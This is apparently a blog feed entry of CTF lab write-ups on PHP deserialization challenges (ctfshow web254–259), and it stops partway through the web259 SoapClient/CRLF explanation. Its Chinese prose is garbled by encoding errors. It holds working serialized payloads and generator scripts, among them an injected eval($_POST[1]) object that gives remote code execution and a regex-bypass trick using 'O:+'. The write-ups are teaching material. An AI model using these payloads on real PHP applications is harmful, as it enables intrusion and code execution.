        <content type="html"><![CDATA[<h2 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h2><p>æºç </p><p><img src="../images/image-20230104214414714.png" alt="image-20230104214414714"></p><p>è¿™é‡Œæ²¡æœ‰é­”æœ¯æ–¹æ³•ï¼Œå› ä¸ºé­”æœ¯æ–¹æ³•æ˜¯ä¸‹åˆ’çº¿å¼€å¤´çš„  â€”â€”&gt;    __toString()  ç±»ä¼¼è¿™ç§</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?username=xxxxxx&amp;password=xxxxxx</span><br></pre></td></tr></table></figure><p>æ²¡ç”¨åˆ°ååºåˆ—åŒ–çš„ä¸œè¥¿ã€‚</p><h2 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h2><p>æºç </p><p><img src="../images/image-20230104215011783.png" alt="image-20230104215011783"></p><p>è¿™é‡Œç”¨åˆ°äº†ååºåˆ—çš„è¯­å¥äº†ï¼Œä½†é­”æœ¯æ–¹æ³•è¿˜æ˜¯æ²¡æœ‰ç”¨åˆ°ã€‚</p><p>è¿™é¢˜å’Œä¸Šä¸€é¢˜çš„ä¸åŒæ˜¯falseæ— æ³•è‡ªåŠ¨å˜æˆtrueäº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¾—æ‰‹åŠ¨å»å˜ã€‚</p><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>ctfShowUser%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>username%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>password%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>isVip%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A1%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><p>è·å–è„šæœ¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>()));</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé¢çš„è¯å‡½æ•°å¯ä»¥åˆ å»ï¼Œè¿™é‡Œä¹Ÿå¯ä»¥ä¸ç”¨urlencode,ç”¨çš„åŸå› æ˜¯protected  privateä¼šäº§ç”Ÿä¸å¯è§å­—ç¬¦ï¼Œå¦‚æœç”¨çš„è¯ï¼Œå°±ä¸ç®¡å•¥æƒ…å†µéƒ½å¯ä»¥è¿‡äº†ã€‚å°±ä¸ç”¨æ‹…å¿ƒä¸å¯è§å­—ç¬¦äº†ã€‚</p><h2 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h2><p>æºç </p><p><img src="../images/image-20230104220444891.png" alt="image-20230104220444891"></p><p>è¿™é‡Œçš„è¯æ¶‰åŠåˆ°usernameå’Œpasswordçš„é—®é¢˜ï¼Œæ—¢è¦ç›¸ç­‰åˆè¦ä¸ç­‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨ååºåˆ—å¤„æ˜¯å¯ä»¥æ§åˆ¶ç±»é‡Œé¢çš„å‚æ•°çš„å€¼çš„</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A1%3A%221%22%3Bs%3A8%3A%22password%22%3Bs%3A1%3A%222%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</span><br></pre></td></tr></table></figure><p>è·å–è„šæœ¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!==<span class="variable language_">$this</span>-&gt;password)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>()));</span><br></pre></td></tr></table></figure><h2 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h2><p>æºç </p><p><img src="../images/image-20230104221218372.png" alt="image-20230104221218372"></p><p>è¿™é‡Œç»ˆäºé‡åˆ°äº†ååºåˆ—åŒ–å‡½æ•°äº†   </p><p>è¿™é‡Œä»‹ç»ä¸€ä¸‹constructå’Œdestructå‡½æ•°ï¼Œå­¦è¿‡c++è¯­è¨€çš„åº”è¯¥éƒ½çŸ¥é“è¿™ä¸¤ä¸ªå‡½æ•°</p><p>construct â€”&gt;  å°±æ˜¯åœ¨new ä¸€ä¸ªæ–°çš„å¯¹è±¡çš„æ—¶å€™ä¼šè‡ªåŠ¨è¿è¡Œçš„å‡½æ•°ï¼Œå¦‚æœclassç±»ä¸­æ²¡æœ‰çš„è¯ï¼Œç³»ç»Ÿå°±ä¼šè‡ªå·±æ–°åˆ›ä¸€ä¸ªï¼Œä½†é‡Œé¢æ²¡æœ‰ä»»ä½•ä¸œè¥¿ã€‚</p><p>destruct â€”&gt;   å°±æ˜¯åœ¨ä¸€ä¸ªç±»è¿è¡Œç»“æŸçš„æ—¶å€™ï¼Œä¼šè‡ªåŠ¨è¿è¡Œçš„å‡½æ•°ã€‚</p><p><strong><img src="../images/image-20230104222641078.png" alt="image-20230104222641078"></strong></p><p><img src="../images/image-20230104222655281.png" alt="image-20230104222655281"></p><p>å°±æ˜¯å…ˆè¾“å‡ºa,åœ¨è¾“å‡ºb.</p><p>å›åˆ°è¿™é“é¢˜</p><p>è¿™é‡ŒæŠŠ__construct å‡½æ•°é‡Œçš„infoæ”¹æˆbackDoorï¼Œå› ä¸ºåœ¨newä¸€ä¸ªctfShowUserçš„æ–°å¯¹è±¡æ—¶ï¼Œä¼šè‡ªåŠ¨æ‰§è¡Œconstructå‡½æ•°ã€‚å°±ä¼šnewä¸€ä¸ªbackDoorçš„æ–°å¯¹è±¡ï¼Œç„¶åctfShowUserç±»ç»“æŸçš„æ—¶å€™ä¼šè‡ªåŠ¨æ‰§è¡Œdestructå‡½æ•°ï¼Œç„¶åå°±ä¼šè°ƒç”¨åˆ°backDoorç±»é‡Œè¾¹çš„getInfoå‡½æ•°ï¼Œé‡Œé¢çš„å‡½æ•°æœ‰ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œï¼Œç„¶åå°±åˆ©ç”¨è¿™ä¸€ç‚¹è¿›è¡Œrceäº†ã€‚</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22%00ctfShowUser%00username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A21%3A%22%00ctfShowUser%00password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A18%3A%22%00ctfShowUser%00isVip%22%3Bb%3A0%3Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A16%3A%22eval%28%24_POST%5B1%5D%29%3B%22%3B%7D%7D</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹åçš„æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>=<span class="string">&#x27;eval($_POST[1]);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> ctfShowUser));</span><br></pre></td></tr></table></figure><p>ç„¶åè‡ªå·±è¿›è¡Œrceå°±è¡Œã€‚</p><h2 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h2><p>æºç </p><p><img src="../images/image-20230104223933413.png" alt="image-20230104223933413"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match(&#x27;/[oc]:\d+:/i&#x27;, $_COOKIE[&#x27;user&#x27;]))</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å¯¹åºåˆ—åŒ–çš„å­—ç¬¦ä¸²è¿›è¡Œäº†è¿‡æ»¤ï¼Œå…¶å®ä¸»è¦è¿‡æ»¤çš„å°±æ˜¯ç¦æ­¢<code>Object</code>ç±»å‹è¢«ååºåˆ—åŒ–ã€‚è™½ç„¶è¿™æ ·çœ‹èµ·æ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œä½†æ˜¯ç”±äºPHPçš„ä¸€ä¸ªBUGï¼Œå¯¼è‡´ä»ç„¶å¯ä»¥è¢«ç»•è¿‡ã€‚åªéœ€è¦åœ¨å¯¹è±¡é•¿åº¦å‰æ·»åŠ ä¸€ä¸ª<code>+</code>å·ï¼Œå³<code>o:14-&gt;o:+14</code>ï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡æ­£åˆ™åŒ¹é…ã€‚</p><p>è¿™ä¸ªæ¼æ´æ˜¯php5.6.24ç‰ˆæœ¬æ‰è¿›è¡Œä¿®å¤.</p><p>ä¿®å¤åâ€”&gt;  <code>/[oc]:[^:]*\d+:/i</code>    è¿™é‡Œçš„è¯ç”¨+å·²ç»ä¸èƒ½ç»•è¿‡äº†ã€‚</p><p>ç¬¬ä¸€æ­¥</p><p>ï¼ˆè¿›è¡Œä¿®æ”¹ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;ctfShowUser&quot;:4:&#123;s:8:&quot;username&quot;;s:6:&quot;xxxxxx&quot;;s:8:&quot;password&quot;;s:6:&quot;xxxxxx&quot;;s:5:&quot;isVip&quot;;b:0;s:5:&quot;class&quot;;O:8:&quot;backDoor&quot;:1:&#123;s:4:&quot;code&quot;;s:16:&quot;eval($_POST[1]);&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒæ­¥</p><p>ï¼ˆurlencode)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A%2B11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A0%3Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A16%3A%22eval%28%24_POST%5B1%5D%29%3B%22%3B%7D%7D</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹åçš„è„šæœ¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&#x27;eval($_POST[1]);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#echo serialize(new ctfShowUser());</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;O:+11:&quot;ctfShowUser&quot;:4:&#123;s:8:&quot;username&quot;;s:6:&quot;xxxxxx&quot;;s:8:&quot;password&quot;;s:6:&quot;xxxxxx&quot;;s:5:&quot;isVip&quot;;b:0;s:5:&quot;class&quot;;O:+8:&quot;backDoor&quot;:1:&#123;s:4:&quot;code&quot;;s:16:&quot;eval($_POST[1]);&quot;;&#125;&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>ç„¶åè¿›è¡Œrceå°±è¡Œäº†ã€‚</p><h2 id="web259"><a href="#web259" class="headerlink" title="web259"></a>web259</h2><p>æºç </p><p><img src="../images/image-20230104232501397.png" alt="image-20230104232501397"></p><p><img src="../images/image-20230104232508253.png" alt="image-20230104232508253"></p><p>è¿™é“é¢˜åˆ©ç”¨çš„æ˜¯åºåˆ—åŒ–çš„ssrfæ€§è´¨</p><h4 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>phpåœ¨å®‰è£…php-soapæ‹“å±•åï¼Œå¯ä»¥ååºåˆ—åŒ–åŸç”Ÿç±»SoapClientï¼Œæ¥å‘é€http postè¯·æ±‚ã€‚å¿…é¡»è°ƒç”¨SoapClientä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œè§¦å‘SoapClientçš„<strong>__callé­”æœ¯æ–¹æ³•</strong>ã€‚é€šè¿‡CRLFæ¥æ·»åŠ è¯·æ±‚ä½“ï¼šSoapClinetå¯ä»¥æŒ‡å®šè¯·æ±‚çš„user-agentå¤´ï¼Œé€šè¿‡æ·»åŠ æ¢è¡Œç¬¦çš„å½¢å¼æ¥åŠ å…¥å…¶ä»–è¯·æ±‚å†…å®¹ã€‚</p><p>SoapClienté‡‡ç”¨äº†HTTPä½œä¸ºåº•å±‚é€šè®¯åè®®ï¼ŒXMLä½œä¸ºæ•°æ®ä¼ é€çš„æ ¼å¼ï¼Œé‡‡ç”¨äº†SOAPåè®®ï¼ˆSOAPæ˜¯ä¸€ç§ç®€å•çš„åŸºäºXMLçš„åè®®ï¼Œå®ƒä½¿åº”ç”¨ç¨‹åºé€šè¿‡HTTPæ¥äº¤æ¢ä¿¡æ¯ï¼‰ï¼Œå…¶æ¬¡æˆ‘ä»¬çŸ¥é“æŸä¸ªå®ä¾‹åŒ–çš„ç±»ï¼Œå¦‚æœå»è°ƒç”¨äº†ä¸€ä¸ªä¸å­˜åœ¨çš„å‡½æ•°ï¼Œä¼šè°ƒç”¨__callæ–¹æ³•ï¼Œå…·ä½“è¯¦ç»†ä¿¡æ¯ï¼Œæ„Ÿå…´è¶£çš„è¯»è€…å¯ä»¥è‡ªè¡ŒæŸ¥é˜…ï¼Œè¿™é‡Œä¸è¿›è¡Œèµ˜è¿°</p><p>CRLFæ˜¯â€å›è½¦ + æ¢è¡Œâ€ï¼ˆrnï¼‰çš„ç®€ç§°ã€‚åœ¨HTTPåè®®ä¸­ï¼ŒHTTP Headerä¸HTTP Bodyæ˜¯ç”¨ä¸¤ä¸ªCRLFåˆ†éš”çš„ï¼Œæµè§ˆå™¨å°±æ˜¯æ ¹æ®è¿™ä¸¤ä¸ªCRLFæ¥å–å‡ºHTTP å†…å®¹å¹¶æ˜¾ç¤ºå‡ºæ¥ã€‚æ‰€ä»¥ï¼Œä¸€æ—¦æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶HTTP æ¶ˆæ¯å¤´ä¸­çš„å­—ç¬¦ï¼Œæ³¨å…¥ä¸€äº›æ¶æ„çš„æ¢è¡Œï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½æ³¨å…¥ä¸€äº›ä¼šè¯Cookieæˆ–è€…HTMLä»£ç ï¼Œæ‰€ä»¥CRLF Injectionåˆå«HTTP Response Splittingï¼Œç®€ç§°HRS</p><p>åœ¨å¤šæ•°CTFé¢˜ç›®ä¸­ï¼Œä¼šå°†è¿™ä¸¤ä¸ªçŸ¥è¯†ç‚¹ç»“åˆèµ·æ¥è€ƒå¯Ÿã€‚</p><p><strong>é¦–å…ˆ</strong></p><p><img src="../images/image-20230105181930658.png" alt="image-20230105181930658"></p><p><img src="../images/image-20230105181617490.png" alt="image-20230105181617490"></p><p>æˆ‘ä»¬åˆ›å»ºå¯¹è±¡çš„æ—¶å€™è®¾ç½®çš„å‚æ•°â€˜uriâ€™SOAPctionï¼Œâ€˜locationâ€™å…·ä½“è¡¨ç°åœ¨POSTå’ŒHostã€‚ æˆ‘ä»¬è¿˜å¯ä»¥æ§åˆ¶å‚æ•°User-Agentï¼Œé€šè¿‡åˆ›å»ºå¯¹è±¡çš„æ—¶å€™æ·»åŠ å‚æ•°â€™user_agentâ€™=&gt;$u</p><p>Content-Type å’Œ Content-Length ä¹Ÿæ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„åœ°æ–¹ã€‚</p><p><strong>å¼€å§‹ä¼ªé€ httpå¤´</strong></p><p><img src="../images/image-20230105182603050.png" alt="image-20230105182603050"></p><p><img src="../images/image-20230105182753522.png" alt="image-20230105182753522"></p><p>æˆåŠŸå†™å…¥ï¼Œé‚£ä¹ˆå°±å¼€å§‹æ ¹æ®é¢˜ç›®çš„è¦æ±‚æ¥å†™å…¥token.</p><p><img src="../images/image-20230105183131849.png" alt="image-20230105183131849"></p><p>æ ¹æ®é¢˜ç›®è¦æ±‚å†™å…¥çš„tokenå’ŒX-Forwarded-For</p><p>è¿™é‡Œè¦æ±‚çš„<code>Content-Length:13</code>æ˜¯å› ä¸ºä¼ªé€ çš„httpå¤´ï¼Œåªéœ€è¦æ‰§è¡Œåˆ°token=ctfshowå°±è¡Œã€‚token=ctfshowé•¿åº¦ä¸º13.</p><p><img src="../images/image-20230105183531826.png" 